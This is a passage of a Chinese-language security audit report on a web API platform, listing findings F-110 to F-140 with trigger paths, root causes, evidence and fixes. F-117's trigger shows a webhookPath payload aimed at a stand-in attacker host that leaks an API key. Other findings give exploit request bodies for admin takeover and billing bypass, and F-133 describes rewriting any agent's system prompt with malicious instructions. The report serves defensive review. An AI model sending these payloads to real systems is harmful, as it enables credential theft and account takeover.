- **触发路径**：坐席连 `/ws/customer-service?as=agent`，发 `{"type":"cs_message","data":{"sessionId":"<任意会话>","content":"..."}}`。
- **根因**：`judgeCsInboundMessage` 只校验结构；`targetSession` 来自客户端，未校验 `session.agentId === agent.id` 与会话状态。
- **证据**：
  - `:257-270`：`const targetSession = String(sessionId)` / `broadcast(targetSession, { type:'cs_message', data:{ ... senderRole:'agent' } })`
- **影响面**：任意坐席可向全部客户会话注入“官方客服”消息（钓鱼/诈骗）。
- **建议修法**：广播前查会话，要求 `agentId === agent.id && status === 'active'`；记录审计。
- **是否当场可修**：是。

### F-111 客服 WS：`acquire` 后早退不 `release`，且异步 IIFE 无 catch

- **严重度**：P2
- **文件与行号**：`apps/api/src/plugins/ws-customer-service.ts:186-202`、`:289-295`、`:399`
- **触发路径**：同一账号连 8 次非坐席/不存在 sessionId，或任意一次 DB 查询抛错。
- **根因**：`WsUserConnectionLimiter(8)` 先占位，随后早退 `close(); return` 时 close 监听器尚未注册；IIFE 无 `.catch`。
- **证据**：
  - `:186-202`：`if (!userConnectionLimiter.acquire(userId)) {...}` → `if (!agent) { socket.close(4004, '非坐席账号'); return }`
  - `:289-295`：`if (!session) { socket.close(4004, '会话不存在'); return }`
- **影响面**：任意用户 8 次即可把自己永久锁死（直到重启）；DB 抖动造成槽位永久泄漏与僵尸连接。
- **建议修法**：`try/catch/finally` 在所有早退分支 `release`；IIFE 末尾 `.catch` 关 socket。
- **是否当场可修**：是。

### F-112 ws-ai：客户端可控身份字段覆盖服务端 `userId`/`provider`，并直传 Coze `user_id`

- **严重度**：P1
- **文件与行号**：`apps/api/src/plugins/ws-ai.ts:541+561`、`:694+718`、`:1046-1047`、`:1061`、`:1092`
- **触发路径**：`{"type":"capability.start","prompt":"...","metadata":{"userId":"<受害者ID>","provider":"x"}}`；Coze 端点 `{"event":"chat.message","user_id":"<受害者ID>"}`。
- **根因**：`metadata: { userId, ...metadata }` 展开顺序让客户端覆盖；Coze 分支直接采信 `msg.user_id`；ai-service 以 `metadata.userId` 为准。
- **证据**：
  - `:561`：`metadata: { userId, ...metadata }`
  - `:718`：`metadata: { userId, provider, ...metadata }`
  - `:1046-1047`：`const reqUserId = (msg.user_id as string) || userId`
  - `:1092`：`user_id: reqUserId`
- **影响面**：伪造下游配额/计费/租户/审计归属（成本转嫁）；可跨用户读写上下文。
- **建议修法**：改为 `{ ...metadata, userId, provider }` 并剥离保留键；Coze 强制用 `userId`；`bot_id` 白名单。
- **是否当场可修**：是。

### F-113 ws-notifications：Redis publish fire-and-forget，拒绝未处理且降级路径不可达

- **严重度**：P2
- **文件与行号**：`apps/api/src/plugins/ws-notifications.ts:180-191`
- **触发路径**：多实例模式（subscriber 已建立）下 Redis publish 失败（断连/超时/failover）。
- **根因**：`void publisher.publish(...)` 后立即 return，同步 try/catch 抓不到 Promise 拒绝；注释所称“降级本机直推”永不执行。
- **证据**：
  - `:180-191`：`if (publisher) { void publisher.publish(channelFor(userId), JSON.stringify(payload)); return }` + `catch { /* 降级 */ }`
- **影响面**：支付/告警等关键通知静默丢失；每次失败产生 unhandled rejection 日志，无补偿。
- **建议修法**：`publish(...).catch(err => { log; localDeliver(...) })`，抽统一 deliver。
- **是否当场可修**：是。

### F-114 ws-payment：归属校验失败即放行 + 无连接上限的 2 秒 DB 轮询

- **严重度**：P2
- **文件与行号**：`apps/api/src/plugins/ws-payment.ts:68-84`、`:153`、`:156-173`、`:176`
- **触发路径**：已认证用户对任意 `orderNo` 建连（含不存在订单）；或校验查询抛错时对他人订单建连。
- **根因**：仅“订单存在且不属于本人”才拒绝；`order` 为空/查询异常继续执行；未接入 `WsUserConnectionLimiter`，每连接 2 秒 SELECT、最长 5 分钟。
- **证据**：
  - `:68-84`：`if (order?.orderUserId && order.orderUserId !== userId) { close }` / `catch { log.warn('...降级放行') }`
  - `:176`：`interval = setInterval(async () => { ... await pushStatus() }, 2000)`
- **影响面**：DB 抖动即 fail-open，泄露订单存在性与状态；单 IP 200 连接 × 0.5 QPS ≈ 100 QPS 持续 5 分钟。
- **建议修法**：查无订单/异常一律 `close(4003)`；接入每用户连接上限；不存在订单不建轮询。
- **是否当场可修**：是。

### F-115 ws-chat：不存在的 roomId 可无限 join，`rooms` Map 与 Redis Set 无界增长

- **严重度**：P2
- **文件与行号**：`apps/api/src/plugins/ws-chat.ts:162-168`、`:639-669`、`:774-800`
- **触发路径**：已认证用户每连接每 1 秒发 `{"type":"room","action":"join","room":"r<随机>"}`（限速 60/分钟），roomId 匹配 `^[a-zA-Z0-9_-]{1,128}$` 且无 meta 即通过。
- **根因**：`checkRoomOwnership` 对不存在房间返回 `true`；`joinRoom` 立即写本地 `rooms`/`member.rooms` 与两个 Redis Set，无每连接/每用户房间数上限，TTL 每次 join 刷新 30 天。
- **证据**：
  - `:162-168`：`if (!meta || Object.keys(meta).length === 0) return true // 房间不存在(允许 join 用于创建)`
  - `:774-800`：`member.rooms.add(targetRoom)` / `r.sadd('chatroom:members:...')` / `r.expire(..., MEMBER_TTL_SEC)`
- **影响面**：每用户每小时约 2.9 万个 Redis Set + 等量本地成员对象（30 天不过期）；多账号可打满内存与 Redis。不能借此进入已存在房间。
- **建议修法**：meta 不存在时仅允许显式建房者 join 或直接拒绝；设房间数上限；关系在 meta 创建时统一写入。
- **是否当场可修**：是。

### F-116 广播链路无背压检查（`bufferedAmount`），慢消费者帧堆积；ws-notifications 发送失败不摘线

- **严重度**：P3
- **文件与行号**：`apps/api/src/plugins/ws-notifications.ts:147-158`、`ws-chat.ts:171-183`、`ws-customer-service.ts:137-150`、`ws-broadcast.ts:377-383`
- **触发路径**：已连接客户端长期不读 socket 但仍维持 pong，期间命中房间/通知/广播。
- **根因**：全部 `ws-*.ts` 中 `bufferedAmount` 出现 0 次；`ws-notifications` 用同步 try/catch 兜 `ws.send`，而写失败走 callback，死连接不被摘除。
- **证据**：
  - `ws-notifications.ts:147-158`：`try { ws.send(msg) } catch { dropConnection(userId, ws) }`
  - 全目录 grep `bufferedAmount` → 无匹配
- **影响面**：ws 内部写队列无上限；半死连接在注册表滞留并持续被广播。
- **建议修法**：统一 `send(msg, cb)` 错误摘线 + `if (ws.bufferedAmount > N) { terminate(); remove }`。
- **是否当场可修**：是。

### 第五轮 D：jobs 与上游代理面

### F-117 `/n8n/workflow/run` 用户可控 `webhookPath` 拼接基址 → N8N_API_KEY 外泄 + SSRF

- **严重度**：P1
- **文件与行号**：`apps/api/src/routes/ai-vendors/proxy-tools.ts:844-846`、`:852`、`:121-125`；`apps/api/src/routes/ai-vendors/_shared.ts:424-429`、`:1066`
- **触发路径**：已登录用户 `POST /api/ai/n8n/workflow/run`，body `{"webhookPath":"@attacker.example/x","inputData":{}}`（不带 `workflowId`）。
- **根因**：`webhookPath` 仅 `z.string().optional()`，无相对路径校验；直接 `\`${base.origin}${body.webhookPath}\`` 拼接。`https://n8n.internal@evil.com/x` 被 URL 解析为 host=evil.com，`fetch` 把 `X-N8N-API-KEY` 发往攻击者；`boundedEgressFetch` 无主机白名单。
- **证据**：
  - `proxy-tools.ts:844-846`：`const url = body.workflowId ? ... : \`${base.origin}${body.webhookPath ?? '/webhook'}\``
  - `:852`：`headers: { 'Content-Type': 'application/json', 'X-N8N-API-KEY': key }`
  - `_shared.ts:1066`：`n8n: { keyEnv: 'N8N_API_KEY', authHeader: (key) => ({ 'X-N8N-API-KEY': key }) }`
- **影响面**：任意登录用户可把平台 n8n Key 送到任意外部/内网端点（`@127.0.0.1:9200/x` 即内网 SSRF 且带密钥头）。
- **建议修法**：用 `new URL(webhookPath ?? '/webhook', base.origin)` 并断言 `u.origin === base.origin && !u.username && !u.password`；schema 拒绝 `@`/`\`/`//`。
- **是否当场可修**：是。

### F-118 `/azure/{chat,models,embeddings,images}` 四个端点漏挂 `requireAuth`，且 images 完全不扣费

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/ai-vendors/proxy-extended-media3.ts:657-689`、`:692-713`、`:716-746`、`:749-777`（对照 `:785` 的 transcriptions 有 `preHandler: requireAuth`）
- **触发路径**：匿名或任意请求直接打 `POST /api/ai/azure/images`、`/azure/chat`、`/azure/embeddings`、`GET /azure/models`。
- **根因**：本文件无插件级 `addHook`，这 4 条漏挂 `preHandler: requireAuth`；`/azure/images` 还漏 `ensurePointsBalance/chargePointsForCall`。
- **证据**：
  - `:657-689`：`server.post('/azure/images', { schema: ... }, async (request, reply) => { ... recordUsage(request.userId!, 'azure'); return reply.send(success(data)) })`
  - 对照 chat：`ensurePointsBalance(...)` + `chargePointsForCall(...)`
  - `plugins/auth-default-deny.ts:63` 仅 enforce 模式兜底，非生产默认 off
- **影响面**：非 enforce 部署匿名可消耗平台 Azure Key（DALL-E 最贵）且零计费；enforce 下登录用户仍可免积分生成图片。
- **建议修法**：4 条补 `preHandler: requireAuth`；`/azure/images` 补余额与按图计费。
- **是否当场可修**：是。

### F-119 Kling 任务查询每轮询一次扣 1500 token，无幂等

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/ai-vendors/proxy-tools.ts:1143-1192`（扣费 `:1171-1184`）
- **触发路径**：`GET /api/ai/kling/task/query/:taskId`，任务已 `succeed` 且带 `videos[0].url` 时，每次请求都扣一次。
- **根因**：扣费条件只看上游当前状态，无“已扣费”标记/任务归属；`taskId` 不校验是否属于 `request.userId`。
- **证据**：
  - `:1171-1184`：`if (status === 'succeed') { if (videoUrl) { await tokenBalance.deductTokens(request.userId!, 1500, 'kling_lip_sync') } }`
- **影响面**：客户端惯例轮询即重复扣费（1500→3000/4500），可扣空余额；他人 taskId 可读结果。
- **建议修法**：按 `(userId, taskId)` 落幂等扣费记录后只扣一次；查询前校验归属。
- **是否当场可修**：是。

### F-120 `ai-world-sync` 无重入保护，且跨轮去重 Set 为模块级共享

- **严重度**：P2
- **文件与行号**：`apps/api/src/jobs/ai-world-sync.ts:1229-1240`、`:1245`、`:1043`；`apps/api/src/routes/ai-world.ts:249-267`；cron `:1348-1372`
- **触发路径**：管理员双击/两人同时 `POST /api/ai-world/sync`，或 12h cron 与手动触发重叠。
- **根因**：`syncAllSources()` 无条件覆盖 `activeSyncAbort`；第二轮在 `runSyncAllSources` 首行 `seenTitlesInRound.clear()` 清掉第一轮共享去重状态。
- **证据**：
  - `:1229-1240`：`activeSyncAbort = abort` / `try { return await runSyncAllSources(abort.signal) }`
  - `:1045`：`seenTitlesInRound.clear()`
- **影响面**：两轮全量抓取并行，重复 upsert/LLM 改写（成本翻倍）；去重 Set 互相清空导致重复入库；取消只能取消最新一轮；多实例无锁。
- **建议修法**：模块级 `running` Promise，在跑则复用/拒绝；`seenTitlesInRound` 改为每轮局部；跨实例用 advisory lock。
- **是否当场可修**：是。

### F-121 `syncOneSourceWithRetry` 把 `writeSyncLog` 放进重试 try，一次写日志失败会中止整轮同步

- **严重度**：P2
- **文件与行号**：`apps/api/src/jobs/ai-world-sync.ts:1157-1212`（`:1193`、`:1211`）；调用侧 `:1257-1259`、`:1276-1282`
- **触发路径**：`sync_logs` 插入失败（表/列未迁移、连接骤断、字段超长）。
- **根因**：`await writeSyncLog(result)` 在 try 内，失败进入 catch 后按 `MAX_RETRY=3` 重跑抓取+upsert；重试耗尽后 try 外的 `writeSyncLog(failed)` 继续上抛；调用方 `Promise.all` 一个源 reject 即整轮 reject。
- **证据**：
  - `:1193`：`await writeSyncLog(result); return result`
  - `:1211`：`await writeSyncLog(failed)`（try 外）
  - `:1257-1259`：`Promise.all(batch.map(...))`
- **影响面**：日志表故障时 RSS 源重复抓取/LLM 改写 3 次并整轮 abort；`seenTitlesInRound.add` 在写库前执行（`:1084`），重试被判 skipped，条目本轮永久丢失。
- **建议修法**：`writeSyncLog` 移出重试 try；源循环改 `allSettled`；`seenTitlesInRound.add` 挪到插入成功后。
- **是否当场可修**：是。

### F-122 `startRankingScheduler` / `startTrendingScheduler` 从未被调用，06:00 榜单与 4h 热度 cron 从未注册

- **严重度**：P2
- **文件与行号**：`apps/api/src/jobs/ai-world-sync.ts:2499-2519`、`:2530-2550`；注册面 `apps/api/src/index.ts:20-24`、`:259-263`、`:402-403`
- **触发路径**：进程启动 `startBackgroundSchedulers()`。
- **根因**：`index.ts` 只 import 并调用 `startAiWorldSyncScheduler`；两个 `startRankingScheduler/startTrendingScheduler` 只 import 了 `stop*` 用于 shutdown，cron 永不生效。
- **证据**：
  - `index.ts`：`import { startAiWorldSyncScheduler, ..., stopRankingScheduler, stopTrendingScheduler }`
  - `:259-263`：`if (...) { startAiWorldSyncScheduler() }`
  - `ai-world-sync.ts:2499`：`rankingScheduledTask = cron.schedule('0 6 * * *', ...)`
- **影响面**：榜单只在 00:00/12:00 全量同步顺带更新；06:00 日更与 4h 热度失效；若补调用会与全量同步同刻并发（叠加 F-120）。
- **建议修法**：二选一——启动时一并启动并从全量移除 `syncRankings/syncTrendingMetrics`；或删除这两个 scheduler；加互斥锁。
- **是否当场可修**：是。

### F-123 热搜 GitHub 采集 `.each` 里不 await 异步写库，失败被当成功、计数虚高

- **严重度**：P2
- **文件与行号**：`apps/api/src/jobs/hot-words-sync.ts:112-120`（`upsertHotWord` `:59-75`；上层 `:153-162`）
- **触发路径**：每 3h cron `0 */3 * * *` 跑 `syncHotWords()` → `fetchGitHubTrending()`。
- **根因**：`.each` 回调非 async，`upsertHotWord(...)` 返回的 Promise 未 await 未 catch；`n++` 在 DB 操作发起前执行；函数正常 resolve。
- **证据**：
  - `:112-120`：`$('article h2 a').each((_, el) => { ... upsertHotWord(repo, pos++); n++ })` / `return Math.min(n, 15)`
  - `index.ts:519-521`：`process.on('unhandledRejection', ...)` 只记日志
- **影响面**：DB 失败时日志仍 success，实际一条未写；`Math.min(n,15)` 只截返回值，实际全部写库；`upsertHotWord` select-then-insert 无唯一约束，可重复。
- **建议修法**：改 `for (const el of ...slice(0,15).toArray()) { await upsertHotWord(...); n++ }`；`hot_words.word` 加唯一约束 + `onConflictDoUpdate`。
- **是否当场可修**：是。

### F-124 审计证据保留任务在事务内持审计链全局锁做全尾扫描 + 逐行 UPDATE（长事务）

- **严重度**：P2
- **文件与行号**：`apps/api/src/jobs/audit-evidence-retention.ts:508-510`、`:517-521`、`:529-549`、`:565-579`；同锁写入方 `apps/api/src/services/audit-log-service.ts:198-200`
- **触发路径**：每天 04:45 cron（dry-run 也走同一事务），`AUDIT_EVIDENCE_RETENTION_APPLY=true` 时改写。
- **根因**：事务第一件事取 `pg_advisory_xact_lock('audit_log_chain')`（与所有审计写入同一把锁），随后两条全表 `COUNT(*)`，再把“首个候选→链尾”全部行 `FOR UPDATE` 读入内存，最后同一事务逐行 `UPDATE`。
- **证据**：
  - `:508-510`：`await tx.execute(sql\`SELECT pg_advisory_xact_lock(hashtext('audit_log_chain'))\`)`
  - `:529-549`：`WHERE timestamp >= ${first.tsIso} ... ${apply ? sql\`FOR UPDATE\` : sql\`\`}`
  - `:565-579`：`for (const u of plan.updates) { await tx.execute(sql\`UPDATE ... WHERE id = ${u.id}::uuid\`) }`
- **影响面**：`batch/maxPurge` 只限制候选与更新数，Slice 无上界；首跑/积压时锁住全链，持锁期间所有 `recordAuditLog` 阻塞；dry-run 也持锁跑全表 COUNT；内存 O(链尾行数)。
- **建议修法**：COUNT 与候选选择放锁外；锁内仅处理连续尾段，用 `UPDATE ... FROM (VALUES ...)` 批量；按 batch 拆短事务；设 `statement_timeout` 与 slice 行数上限。
- **是否当场可修**：是（需重构）。

## 十、第六轮新增（admin / 顶层 agent-AI / services / utils-db / other-user）

> 本轮 5 路并行（A admin、B 顶层 agent/AI、C services、D utils/db、E other/user），共 36 条。关键 P0/P1 已回读工作树复核（`agent-extended.ts:1616-1645`、`admin.ts:653-673`、`user/misc-routes.ts:157-162`、迁移 `20261106150000_fix_missing_indexes_fks.sql:91,188`）。

### 第六轮 A：admin 面

### F-125 任意管理员可重置「系统内置管理员」密码，直接接管 root 账号
- **严重度**：P1
- **文件与行号**：`apps/api/src/routes/admin.ts:653-673`；`apps/api/src/routes/admin-sys/user-routes.ts:17-31`
- **触发路径**：普通管理员 `POST /api/admin/users/<内置管理员uuid>/resetPwd {"newPassword":"..."}`，或 `PUT /api/admin/resetPwd {"userId":"<内置管理员uuid>","password":"..."}`。
- **根因**：`isSystemAdminUser()` 只用于删除/状态变更（`admin.ts:426,559`），两个改密端点未判定，且改密后未 `revokeAllUserRefreshTokens`。
- **证据**：`admin.ts:653` `server.post('/users/:id/resetPwd', ...)` → `:664` `findUserByIdAdmin(...)` → `:666` `hashPassword(...)` → 直接 `update(users).set({passwordHash})`；对照 `auth.ts:557` 自助改密有 `revokeAllUserRefreshTokens(user.id)`。
- **影响**：任意 admin 可改掉受保护内置管理员密码并登录，形成持久 root 接管；旧 refresh token 仍有效。
- **建议修法**：写入前 `isSystemAdminUser(targetId) && request.userId !== targetId` 拒绝；统一吊销 refresh；补审计。
- **是否当场可修**：是。

### F-126 admin 可把任意第三方 openId 绑到系统管理员 userId，再走第三方登录接管
- **严重度**：P1
- **文件与行号**：`apps/api/src/routes/admin/auth-accounts.ts:23,62-79`；`apps/api/src/routes/admin/_shared.ts:136-144`；`apps/api/src/db/oauth-queries.ts:227-241`；`apps/api/src/routes/auth-extended.ts:555-562`
- **触发路径**：管理员 `POST /api/admin/auth-accounts {"userId":"<内置管理员uuid>","platform":"wechat","openId":"<可控IdP身份>"}` → 用该 IdP 登录。
- **根因**：admin 绑定写入不校验 `userId` 是否为受保护账号，第三方登录直接把绑定的 `userId` 当登录主体；`(platform,openId)` 无唯一索引，`orderBy(createdAt) limit 1` 可被重建绑定劫持。
- **证据**：`auth-extended.ts:555-562` `const binding = await findThirdPartyAccount(platform, openId); const existing = await findUserById(binding.userId); user = existing`。
- **影响**：普通 admin → 系统内置管理员的完整登录态，绕过「内置管理员不可删除/禁用」。
- **建议修法**：绑定前拒绝 `isSystemAdminUser`；`(platform,openId)` 建唯一索引；禁止已绑定 openId 改绑；写审计。
- **是否当场可修**：是。

### F-127 批量禁用 / 成员禁用删除不吊销 refresh token，「禁用」在会话面不生效
- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/admin-extended/user-routes.ts:250-280`（对照单条 `:133-152` 已修）；`apps/api/src/routes/admin/member-users.ts:123-145,177-192`
- **触发路径**：`POST /api/admin/admin/users/batch-status {"ids":[...],"status":0}`；`PATCH/DELETE /api/admin/member/users/:id`。
- **根因**：单条 PUT 已补 `revokeAllUserRefreshTokens`，批量入口与 member-users 两套写路径未同步。
- **证据**：`:150-152` 单条有 revoke；`:265-269` 批量仅 `update(users).set({status})`；`member-users.ts:143/189-191` 同样无 revoke。
- **影响**：封禁/注销后旧 refresh token 仍可换新 access token，禁用动作被绕过。
- **建议修法**：批量循环内 `status !== 1` 逐条 revoke；member-users 同步；refresh 时兜底校验用户 status。
- **是否当场可修**：是。

### F-128 admin-sys 重置密码把明文密码写入 sys_operlog，并原样返回给任意管理员
- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/admin-sys/user-routes.ts:17-31`；`apps/api/src/routes/admin-sys/_audit-hook.ts:48-57`；`apps/api/src/db/admin-sys-queries.ts:943-950`；`apps/api/src/routes/admin-sys/operlog-routes.ts:14-24`
- **触发路径**：`PUT /api/admin/resetPwd {"userId":"...","password":"明文"}` → 任意管理员 `GET /api/admin/operlog/list`。
- **根因**：审计钩子 `JSON.stringify(request.body).slice(0,2000)` 全量入 `operParam`，无字段脱敏；列表 `select()` 全列返回。
- **证据**：`_audit-hook.ts:50-54` 直接序列化 body；`admin-sys-queries.ts:944` `.select().from(sysOperlog)`。
- **影响**：明文密码长期落库，任何能读日志的后台角色可获取他人密码。
- **建议修法**：按 key 递归脱敏 `password/newPassword/token/secret/apiKey`；或该端点不记录 body。
- **是否当场可修**：是。

### F-129 单条审核接口无条件置 status=1，可复活封禁/注销用户；缺 uuid 形状闸
- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/admin-extended/user-routes.ts:155-174`
- **触发路径**：`POST /api/admin/admin/users/<id>/review`，id 为 status=2（封禁）或 3（注销）用户。
- **根因**：`.set({status:1})` 无状态前置条件（批量 `:283-311` 有 `eq(status,0)`）；无 `isUuidString` 闸，非 uuid 触发 22P02 → 500；无 `logAction`。
- **证据**：`:155-174` `update(users).set({ status: 1, updatedAt: new Date() }).where(eq(users.id, id)).returning()`。
- **影响**：封禁/注销可被一次误点解除且不可追溯。
- **建议修法**：`where(and(eq(id), eq(status,0)))`；先 uuid 校验返回 400/404；补审计。
- **是否当场可修**：是。

### F-130 `DELETE /admin/orders/:id` 硬删已支付订单并级联清空支付流水
- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/admin-extended/order-routes.ts:46-56`；`packages/database/src/schema/billing.ts:121-123`；`packages/database/src/schema/order.ts:68-70`
- **触发路径**：管理员 `DELETE /api/admin/admin/orders/<已支付订单uuid>`。
- **根因**：删除前不查支付状态、不做软删；`payments.order_id`、`edu_payments.order_id` 均为 `onDelete:'cascade'`。
- **证据**：`:46-56` 先 `delete(eduOrders)` 再 `delete(orders)`，无 status 条件；schema 两处 `references(..., { onDelete: 'cascade' })`。
- **影响**：一次删除抹掉已支付订单与网关原始响应，财务对账/退款/发票与审计证据不可恢复，且无审计。
- **建议修法**：已支付/已退款禁止物理删除（409 或软删）；补 `logAction`。
- **是否当场可修**：是（状态守卫可立即加）。

### F-131 member-users 整插件跳过响应脱敏 + `returning()` 全行，返回 passwordHash
- **严重度**：P3
- **文件与行号**：`apps/api/src/routes/admin/member-users.ts:24,123-145,147-173,177-192`
- **触发路径**：`PATCH /api/admin/member/users/<uuid> {"nickname":"x"}`、`POST /api/admin/member/users`、`DELETE .../:id`。
- **根因**：插件级 `request.skipResponseSanitization = true`，写操作 `.returning()` 无投影返回 users 全列；GET 列表反而做了列投影。`status` 仅 `z.number().int()`，无 0-3 枚举。
- **证据**：`:24` `skipResponseSanitization = true`；`:143` `.returning()`；`:132/:155` `status: z.number().int().optional()`。
- **影响**：任意管理员可批量拉取全站用户 bcrypt 哈希；`status` 可写任意整数制造异常账号态。
- **建议修法**：写路径改白名单 `returning({...})`；收窄 skip；status 枚举。
- **是否当场可修**：是。

### F-132 `POST /admin/users` 请求契约自相矛盾：schema 要求 passwordHash，handler 只认 password
- **严重度**：P3
- **文件与行号**：`apps/api/src/routes/admin.ts:453-506`（`:463 required`、`:467`、`:86-93`、`:500`）
- **触发路径**：按文档传 `{"nickname":"x","passwordHash":"$2b$..."}` → 400；传 `{"nickname":"x","password":"123456"}` → ajv 因缺 `passwordHash` 先 400。
- **根因**：路由 JSON Schema `required:['passwordHash']` 且不含 `password`，handler 用 zod `createUserBodySchema`（`password` 必填）并二次 `hashPassword`；`passwordHash` 被静默忽略。
- **证据**：`:463-467` vs `:86-89` vs `:500` `passwordHash: await hashPassword(parsed.data.password)`。
- **影响**：按文档创建用户必失败；传 passwordHash 以为存的是自己的哈希。
- **建议修法**：schema 与 zod 二选一，统一为 `password` 且删二次哈希歧义。
- **是否当场可修**：是（需确认前端实际传参）。

### 第六轮 B：顶层 agent / AI 路由

### F-133 `/api/agent-ext/personality/:agentId` 无任何归属/管理员校验，任意登录用户可改写任意智能体系统提示词
- **严重度**：P0
- **文件与行号**：`apps/api/src/routes/agent-extended.ts:1630-1648`（GET `:1616-1629`）；插件级仅 `requireAuth`（`:222-224`）
- **触发路径**：任意登录账号 `PUT /api/agent-ext/personality/<任意agentId>` body `{"personality":"<任意指令>"}`。
- **根因**：直接 `UPDATE agents SET agent_prompt`，未比对 `agents.user_id` 与 `request.userId`，也无 `requireAdmin`。
- **证据**（已回读）：`:1639` ``sql`UPDATE ${sql.raw('"agents"')} SET "agent_prompt" = ${personality}, "updated_at" = NOW() WHERE "agent_id"::text = ${agentId} RETURNING ...` ``；下游 `mobile-chat-routes.ts:372-373`、`v1-public.ts:1257-1258` 当 system 使用。
- **影响**：任意用户可把任意已发布智能体的 system prompt 改成恶意指令，影响所有调用方；GET 还可读任意智能体私有提示词。
- **建议修法**：校验 `agents.user_id === request.userId || isAdmin`；personality 限长；公开读仅 published。
- **是否当场可修**：是。

### F-134 编排/LLM 预算治理面仅 `authenticate`，上游 ai-service 无角色校验：可改全局预算、伪造用量、重置降级并读全站 trace
- **严重度**：P1
- **文件与行号**：`apps/api/src/routes/orchestration.ts:298-306`、`:243-251`、`:287-296`、`:218-231`、`:353-371`；`apps/ai-service/app/routers/orchestration.py:369-383`、`:433-454`、`:203-492`；`apps/ai-service/app/core/jwt_auth.py:119-184`
- **触发路径**：任意登录用户 `PATCH /api/orchestration/budget/config`、`POST /budget/record`、`POST /budget/pillar/chat/reset`、`GET /telemetry/traces?limit=100`。
- **根因**：网关只挂 `authenticate`；上游 router 无 `Depends`/角色判断，budget governor 为进程级单例。
- **证据**：`orchestration.py:369-383` handler 无任何校验参数；`main.py:1261` 裸 `include_router`；`jwt_auth.py` 仅验签注入 role_id 不判管理员。
- **影响**：任意租户可拆掉全局 LLM 预算保护、伪造 usage 使他人降级（DoS）、读取跨租户 trace。
- **建议修法**：config/record/reset 改 `requireAdmin` 或内部服务票；traces 按主体过滤。
- **是否当场可修**：是。

### F-135 `/api/agent-ext/buy/create` 订单金额与时长完全由客户端决定，并立即写入开发者结算表
- **严重度**：P1
- **文件与行号**：`apps/api/src/routes/agent-extended.ts:575-581`、`:584-621`；`apps/api/src/services/settlement-service.ts:373`（内部 `:170` 插 `agent_settlements`）
- **触发路径**：`POST /api/agent-ext/buy/create` body `{"agentId":"<高价值agent>","userId":"<自己>","price":0,"duration":876000}`。
- **根因**：`price`/`duration` 直接取客户端（`price: z.number().min(0)`），未按 agent 定价取价、无 duration 上限；结算同步在「下单」而非支付成功后。
- **证据**：`:584-621` `.values({ ..., price: body.price.toString(), duration: body.duration, ..., status:'pending' })` 后 `await syncAgentBuyToSettlement({...})`。
- **影响**：可生成任意金额/超长订单与待结算记录，污染开发者分账；0 元购买；duration 无上限。
- **建议修法**：price 服务端按配置计算，duration 枚举限上限；结算移到支付成功回调并以支付金额为准。
- **是否当场可修**：是。

### F-136 `/api/agent-ext/developer/renew` 无支付环节，任意（含超长/负数）时长免费续费
- **严重度**：P1
- **文件与行号**：`apps/api/src/routes/agent-extended.ts:667-695`；schema `:259-263`
- **触发路径**：已有 active 订阅的登录用户 `POST /api/agent-ext/developer/renew {"agentId":"...","userId":"<自己>","duration":99999}`。
- **根因**：通过 `userId===request.userId` 的 IDOR 校验后，直接 `expires_at += duration*86400000`、`duration += duration`，无订单/支付/上限；`renewBody.duration: z.number()` 无 int/min/max。
- **证据**（已回读）：`:667-672` 仅 IDOR 校验；`:684` `Math.max(existingRow.expiresAt.getTime(), Date.now()) + duration * 86400000`。
- **影响**：付费智能体可无限免费续期；小数时长可致列类型错误 500。
- **建议修法**：续费走「待支付订单 + 回调激活」；duration 枚举限上限。
- **是否当场可修**：是。

### F-137 `/api/coze/variables` 全局 Coze 变量表无租户隔离：任意登录用户可按名读值、改、删
- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/coze-variables.ts:57-119`；`apps/api/src/db/misc-queries.ts:45-85`；`packages/database/src/schema/misc-extended.ts:27-36`
- **触发路径**：`GET /api/coze/variables/retrieve?variableName=xxx&botId=yyy` 直接返回整行（含 `variableValue`）；`POST /update`、`/delete` 按 uuid 改/删任意变量。
- **根因**：插件仅 `checkAuth`；查询不过滤主体；表结构无 user/tenant 列；变量名可枚举。
- **证据**：`coze-variables.ts` `findCozeVariableByName(...)` 直接 `reply.send(success(variable))`；`misc-queries.ts:45-85` `.select()` 全列。
- **影响**：读取/覆盖/删除全站 Coze 变量（常含 token/密钥类值）。
- **建议修法**：纳入管理员权限或加 owner 列过滤；`retrieve` 只回必要字段。
- **是否当场可修**：是。

### F-138 `POST /api/agent-ext/developer` 采信 body 的 `user_id/creator_id`，可把记录写到他人名下
- **严重度**：P3
- **文件与行号**：`apps/api/src/routes/agent-extended.ts:1576-1601`；列定义 `:1477-1487`
- **触发路径**：`POST /api/agent-ext/developer {"user_id":"<受害者uuid>","creator_id":"<受害者uuid>","type":1,"count":99,"status":1}`。
- **根因**：`developerLinkCreateSchema` 由列清单生成，接受 `user_id`；同文件 `/upload`、`/need-task` 都用 `request.userId` 覆盖，此处漏了。
- **证据**：`:1576-1601` `rawInsert('zhs_developer_link', developerLinkCols, body, reply)`，`developerLinkCols` 含 `user_id/creator_id`。
- **影响**：可在任意用户名下植入开发者链接记录，污染列表与对账。
- **建议修法**：插入前强制 `body.user_id = body.creator_id = req.userId`（非管理员）。
- **是否当场可修**：是。

### 第六轮 C：services

### F-139 知识库入库「先插 doc、再一次 bulk insert 全部 chunk」，大文件必失败并留下空壳文档
- **严重度**：P1
- **文件与行号**：`apps/api/src/services/knowledge-rag-service.ts:174-205`；入口 `apps/api/src/routes/knowledge-rag.ts:236-270`（bodyLimit 21MB）；`services/document-parser.ts:37,223`（文本上限 20MB）
- **触发路径**：`POST /api/knowledge/upload` 上传 ≥5MB 纯文本/Markdown/HTML。
- **根因**：doc 与 chunk 不同事务；所有 chunk 单条 `insert().values(chunkRows)`，5MB≈11100 chunk×6 参数>65535 上限必抛；`chunks.map` 无并发闸，一次上传发起数万 embedding 请求。
- **证据**：`:174-187` 先插 doc；`:190-203` `Promise.all(chunks.map(...))`；`:204` 单条 `insert(knowledgeChunk).values(chunkRows)`。
- **影响**：请求 500 但 doc 已提交，`chunkCount` 虚高实际 0 chunk，RAG 永不命中；重传堆垃圾；数万次 embedding 费用/连接。
- **建议修法**：`db.transaction` 包住；chunk 按 500-1000 批插；embedding 并发闸；doc 最后插或失败回滚。
- **是否当场可修**：是。

### F-140 无 embedding 时知识检索把该用户全部 chunk 拉进内存逐条打分，聊天每轮触发
- **严重度**：P1
